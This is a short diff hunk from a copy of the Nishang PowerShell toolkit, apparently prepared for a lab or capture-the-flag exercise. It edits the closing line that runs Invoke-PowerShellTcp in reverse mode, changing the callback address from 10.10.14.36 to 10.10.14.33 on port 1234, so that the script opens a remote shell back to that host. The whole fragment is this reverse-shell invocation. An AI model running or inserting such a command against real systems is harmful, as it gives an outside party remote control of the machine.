@@ -124,7 +124,4 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
-
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.36 -Port 1234
-
-
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.33 -Port 1234
